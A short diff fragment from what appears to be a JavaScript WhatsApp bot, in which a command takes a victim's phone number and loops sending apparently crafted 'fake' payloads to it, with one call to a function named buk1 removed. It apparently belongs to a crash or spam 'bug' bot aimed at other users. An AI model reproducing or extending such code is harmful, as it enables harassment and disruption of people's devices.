@@ -512,7 +512,6 @@ if (!q) return reply(`Example: ${prefix + command} 2547×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(`Wait Your Target is being Utilised`)
 for (let i = 0; i < 2; i++) {
-await buk1(sam, target, "SPIDER", 1020000, ptcp = true);
 await sendRp(target, fake)
 await sendRp(target, fake)
 await beta2(sam, target, fake)
